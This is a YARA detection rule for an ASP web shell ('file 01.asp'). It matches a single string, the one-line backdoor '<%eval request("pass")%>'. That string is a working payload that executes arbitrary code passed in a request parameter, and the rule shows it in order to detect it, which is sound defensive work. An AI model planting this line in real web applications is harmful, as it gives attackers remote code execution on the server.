rule webshell_asp_01 {
  meta:
    author = "Spider"
    comment = "None"
    date = "2014/01/28"
    description = "Web Shell - file 01.asp"
    family = "None"
    hacker = "None"
    hash = "61a687b0bea0ef97224c7bd2df118b87"
    judge = "unknown"
    license = "https://creativecommons.org/licenses/by-nc/4.0/"
    reference = "None"
    score = 50
    threatname = "None"
    threattype = "None"
  strings:
    $s0 = "<%eval request(\"pass\")%>" fullword
  condition:
    all of them
}